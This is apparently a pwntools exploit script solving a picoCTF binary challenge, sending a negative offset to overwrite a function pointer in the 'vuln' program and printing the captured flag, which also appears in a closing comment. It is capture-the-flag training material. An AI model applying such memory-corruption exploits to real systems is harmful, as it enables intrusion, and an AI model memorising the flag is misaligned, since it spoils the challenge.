#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

HOST, PORT = "saturn.picoctf.net 57635".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p
        

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *(vuln+116)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

story = cyclic_gen().get(0x70)
if args.GDB:
    pause()
io.sendlineafter(b"1337 >> ", story)
offset = -0x10
hard_checker_offset = 0x2f
payload = b""
payload += str(offset).encode()
payload += b" "
payload += str(hard_checker_offset).encode()
io.sendlineafter(b"than 10.\n", payload)

io.recvline()
flag = io.recvline().strip().decode()

log.success(f"Got flag: {flag}")

# [+] Got flag: picoCTF{0v3rwrit1ng_P01nt3rs_4453c7be}
